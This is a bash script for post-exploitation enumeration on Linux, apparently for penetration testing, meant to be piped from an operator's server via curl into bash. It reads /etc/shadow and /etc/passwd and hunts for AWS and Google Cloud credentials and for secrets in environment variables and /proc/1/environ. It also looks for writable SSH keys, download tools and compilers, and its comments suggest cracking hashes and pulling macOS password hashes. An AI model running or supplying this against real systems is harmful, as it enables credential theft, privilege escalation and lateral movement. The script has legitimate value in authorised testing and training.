#!/bin/bash
# 
# Script documents a variety of ways to perform linux privilege escalation/
# lateral movement within Linux environment
# 
# Configure the variables in this script to ensure that script can be executed
# in the fileless manner on the target e.g. via curl, /bin/bash
#   curl -s -k "$SERVER_PROTO://$SERVER_HOST:$SERVER_PORT/invoke_linux_lateral_movt.sh" \
#     | /bin/bash
# 

# -----------------------------------------------------------------------------
# Variables - Operator to execute 
# -----------------------------------------------------------------------------

# The Server IP address to connect to download the filesss
SERVER_HOST="127.0.0.1"

# The port to connect to download the files
SERVER_PORT="8001"

# The protocol to use to pull the content from the remote server
SERVER_PROTO="https"

# User agent string to use to download the files
# Linux User-agent string
#USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0"
# Mac User-agent string
USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"

# Download method to use to download the file or file as a string
FILE_DOWNLOAD_METHOD="curl"

# Shell to use to execute commands e.g. /bin/bash, /bin/zsh, /bin/sh, /bin/dash
SHELL="/bin/bash"

# Execute only a subset of command specified
EXEC_SUBSET="1"

# Run searches that take a long time e.g. find commands
RUN_LONG_RUNNING_CMDS=0
# -----------------------------------------------------------------------------

function exec_cmd {
    # Function executes a command provided and prints the output displayed
    # 
    # Args:
    #     cmd_to_exec: Execute command. Required.
    # 
    local cmd_to_exec=${1:-""}
    local shell=${2:-"$SHELL"}

    if [ ! -z "$cmd_to_exec" ]; then
        echo "[*] Executing command: $cmd_to_exec"

        # Execute the command using speccified shell
        $shell -c "$cmd_to_exec"

        # create some blank lines for clarity
        echo; echo
    fi
}

function download_file {
    # Function downloads file from the specified URL to a specific file
    # 
    # Args: 
    #     url: URL from which file is downloaded
    # 
    local url="$1"
    local filename=${2:-""}
    local file_download_method=${3:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ -z "$filename" ]; then
            # Prepare the file to download to
            filename=$(dirname "$0")
        fi

        echo "[*] Downloading from url: $url to file: $filename"
        if [ "$file_download_method" == "curl" ]; then
            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url" -o "$filename"
        elif [ "$file_download_method" == "wget" ]; then
            # Download the file
            wget --no-check-certificate -U "$USER_AGENT" "$url" -O "$filename"
        fi
        
        echo; echo
    fi
}

function download_string {
    # Function downloads file as a string from the specified URL. Useful if 
    # we wish to pass a binary for file-less download.
    # 
    # Args:
    #     url: URL to download the file from. Required.
    #     string_download_method: Method to use to download the file as a string.
    #         Can be one of: curl
    # 
    # Output:
    #     Contents of downloaded file
    # 
    local url="$1"
    local string_download_method=${2:-"$FILE_DOWNLOAD_METHOD"}

    if [ ! -z "$url" ]; then
        if [ "$string_download_method" == "curl" ]; then

            # Download the file via curl
            curl -A "$USER_AGENT" -s -k "$url"
        fi
    fi
}

if [ "$EXEC_SUBSET" == "1" ]; then
    # Execute a subset of commands specified here - for testing.
    :
    
else
    # Execute all commands for privilege escalation/lateral movement checks

    echo "[!] Check for all users in home dirs if ~/.ssh/authroized_keys file \
is writable by the current user?. If ~/.ssh/authorized_keys file writable? If \
yes, then we can login with that - see https://www.debian.org/devel/passwordlessssh"
    exec_cmd "ls -l /home/*/.ssh/authorized_keys"
    exec_cmd "ls -l /root/.ssh/authorized_keys"

    echo "[!] Display the PATH environment variable where executables? Typical \
PATH values should be: /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
    exec_cmd "echo \$PATH"

    echo "[!] Determine which shells are available and can we symlink it? Used \
in exploits?"
    exec_cmd "which bash; which sh; which dash; which zsh; ls -l /bin/bash; \
ls -l /bin/sh; ls -l /bin/dash; ls -l /bin/zsh"

    echo "[!] Determine File Download Tools using 'which' command. For using XXD\
See https://www.linuxjournal.com/content/doing-reverse-hex-dump, where you can \
just copy the output via clipboard into the new shell. Base64 encoded output can \
also be simply copied across and decoded via base64."
    exec_cmd "which \"curl\"; which \"busybox\"; which \"wget\"; which \"curl\"; which \"nc\"; \
which \"nc.traditional\"; which \"netcat\"; which \"tftp\"; which \"ftp\"; \
which \"scp*\"; which \"xxd\"; which \"vim\"; which \"vi\"; which \"python\"; \
which \"base64\""

    echo "[!] Determine code compilers that can be ussed for compiling exploit \
code files via 'which' command"
    exec_cmd "which ruby; which perl; which php; which python; which gcc; \
which gcc-4.4; which gcc-4.6; which gcc-4.8; which cc"

    echo "[!] What mounts are actually available via /etc/fstab - any hidden/ \
unmounted points?"
    exec_cmd "cat /etc/fstab"

    echo "[!] Is private .reiserfs files present? # mount must be available in \
/etc/fstab with user_xattrsReiserFS Exploit for old Linux versions: \
https://www.exploit-db.com/exploits/12130/"
    exec_cmd "ls -l /.reiserfs_priv/xattrs"

    echo "[!] Are we running inside a sandbox e.g. a docker container - check via \
/.dockerenv and cgroup? Taken from: https://www.denialof.services/lambda/"
    exec_cmd "ls -l /.dockerenv; cat /proc/1/cgroup | grep -i docker"

    echo "[!] Are we running inside an AWS Lambda function? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "ls -l /var/runtime/awslambda/bootstrap.py"

    echo "[!] Discover if there are .aws credentials on the device - which can \
be used for laterally moving creds. Once discovered, use the cloud_checks to \
review s3 buckets/access level with these keys. Also, check if you can actually \
create snapshots of the ec2 instance, and copy it to another account AND then \
review creds - privilege escalation via AWS EBS snapshot. Refs - Taken from: \
http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/"
    exec_cmd "ls -l ~/.aws/credentials; ls -l ~/.aws"

    echo "[!] Get the AWS Lambda input event values if running on Lambda \
function"
    download_string "http://localhost:9001/2018-06-01/runtime/invocation/next"

    echo "[!] List mountable block devices which can be mounted with the lsblk \
command. Once we find a mount system, run the command to get the type and then \
mount it: \
    sudo file -s <mount-eg-/dev/xvdf1>.
Or, Mount the block device: \
    mkdir /tmp/mount_point; sudo mount <device-type> /tmp/mount_point
# Taken from: /dev/xvdf1 flaws_cloud_level_3_public_unencrypted_snapshot_volume"
    exec_cmd "lsblk"

    echo "[!] What other mounts are available using 'mount' command? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "mount"

    echo "[!] List contents of home directory via find, ls commands."
    exec_cmd "ls -la /home/; find /home; ls -la /root; find /root"

    echo "[!] List contents of the web directory (if any) via 'ls' and 'find'"
    exec_cmd "ls -la /var/www; find /var/www"

    echo "[!] What mounts are actually available via /proc/.../mounts command - \
any interesting mounts that we can read/write? Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "cat /proc/1/mounts; cat /proc/1/mountinfo"

    echo "[!] Look for any interesting mounts and their storage space?"
    exec_cmd "df"

    echo "[!] Look for any interesting files/folder configurations within /etc \
folder? Any interesting soft"
    exec_cmd "ls -l /etc/"
    
    echo "[!] What /dev (device) mounts actually available via ls command - \
any interesting mounts that we can read/write?. Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "ls -l /dev/"
    
    echo "[!] Determine the current user via 'id' command"
    exec_cmd "id"

    echo "[!] Determine the current user via 'whoami' command"
    exec_cmd "whoami"

    echo "[!] Get the IP address via 'ifconfig' command"
    exec_cmd "ifconfig"

    echo "[!] Get the IP address via 'ifconfig' command"
    exec_cmd "ip addr show"

    echo "[!] Get other systems within the same subnet via 'arp'"
    exec_cmd "arp -a; cat /proc/net/arp"
    
    echo "[!] Show all services running - any unencrypted services that we can \
takeover and steal creds such as POP/IMAP"
    exec_cmd "netstat -atunp"

    echo "[!] Get the User ID via the '\$UID' command"
    exec_cmd "cat /etc/passwd | grep -i \"\$UID:\""

    echo "[!] Determine the Linux version via 'uname' - any vulns?"
    exec_cmd "uname -a"

    echo "[!] Determine the versions in use via 'release' and other configs"
    exec_cmd "cat /etc/os-release; cat /etc/issue; uname -a; cat /etc/*release; \
lsb_release -a; ls /boot | grep \"vmlinuz\""

    echo "[!] Look for SQLITE Google cloud credentials stored locally for the \
service account on the PC"
    exec_cmd "ls -l ~/.config/gcloud/credentials.db; ls -l ~/.config/gcloud"

    echo "[!] Determine the Linux version via '/etc/issue' - any vulns?"
    exec_cmd "cat /etc/issue"

    echo "[!] Determine which user is member of which group via '/etc/group?"
    exec_cmd "cat /etc/group"

    echo "[!] Listing the scheduled crontab entries via cron, crontab"
    exec_cmd "cat /etc/crontab; crontab -l; ls -l /usr/lib/cron"

    echo "[!] Listing the scheduled jobs via 'at' - any scripts with creds? Are \
they writable and run as another user?"
    exec_cmd "at -l"

    echo "[!] Listing environment variables via export - any credentials?"
    exec_cmd "export"

    echo "[!] Listing environment variables via env - any credentials?"
    exec_cmd "env"

    echo "[!] Listing environment variables via env - any credentials? /proc, \
environ can show deleted creds too. Taken from: \
https://www.denialof.services/lambda/"
    exec_cmd "cat /proc/1/environ"

    echo "[!] List the nameservers for Linux - can look for what type of \
nameserver it is"
    exec_cmd "cat /etc/resolv.conf"

    echo "[!] Listing if /etc/passwd and /etc/shadow are writable? Then, we can \
"
    exec_cmd "ls -l /etc/passwd; ls -l /etc/shadow; ls -l /etc/group"

    echo "[!] Determine list of all users '/etc/passwd'. Any indications of \
software installed given username with vulns?"
    exec_cmd "cat /etc/passwd"

    echo "[!] Determine list of all users '/etc/passwd'. Any indications of \
software installed given username with vulns?"
    exec_cmd "cat /etc/passwd"

    echo "[!] Determine the list of all users '/etc/shadow'. Are we already \
root? Can we crack hashes? Any software installed determined from usernames \
with vulns?"
    exec_cmd "cat /etc/shadow"

    echo "[!] Extract the location of list that contain shadow hashes in Macbook \
as described here: https://apple.stackexchange.com/questions/186893/os-x-10-9-where-are-password-hashes-stored. \
To extract the hashes, run the command: 
    sudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o -"
    exec_cmd "ls -l /var/db/dslocal/nodes/Default/users/*"
    
    if [ "$RUN_LONG_RUNNING_CMDS" -eq "1" ]; then

        echo "[*] Determine code compilers that can be used for compiling exploit \
code files via 'find' command"
        exec_cmd "find / -name \"perl*\"; find / -name \"python*\"; \
find / -name \"gcc*\"; find / -name \"gcc-4.4*\"; find / -name \"cc*\"; \
find / -name \"ruby*\""

        echo "[*] Determine possible File Download Tools using 'find' command"
        exec_cmd "find / -name \"busybox*\"; find / -name \"wget*\"; \
find / -name \"nc*\" ; find / -name \"netcat*\" ; find / -name \"tftp*\" ; \
find / -name \"ftp*\"; find / -name \"scp*\"; find / -name \"xxd*\"; \
find / -name \"base64*\"; find / -name \"curl*\""

        echo "[*] List the contents of the /var directory, maybe there is a www \
directory, if not found"
        exec_cmd "ls -la /var"
    fi
fi